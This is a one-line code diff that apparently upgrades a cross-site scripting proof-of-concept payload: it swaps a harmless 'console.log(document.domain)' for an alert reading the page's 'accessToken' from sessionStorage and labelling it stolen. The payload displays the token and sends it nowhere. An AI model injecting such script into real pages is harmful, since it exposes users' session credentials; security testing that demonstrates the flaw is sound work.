@@ -1,1 +1,1 @@
-console.log(document.domain)
+alert("Stolen access token: " + sessionStorage.getItem('accessToken'))
